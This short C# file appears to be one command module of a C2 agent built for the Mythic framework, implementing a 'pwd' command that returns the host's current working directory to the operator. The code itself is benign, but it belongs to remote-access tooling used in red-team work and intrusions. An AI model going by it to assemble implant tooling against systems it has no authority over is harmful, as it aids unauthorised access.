using Models.Tasks;

using System.IO;

namespace Tasks.Commands
{
    public class PrintWorkingDirectory : CerberusCommand
    {
        public override string Name => "pwd";

        public override string Execute(MythicTask task)
        {
            return Directory.GetCurrentDirectory();
        }
    }
}
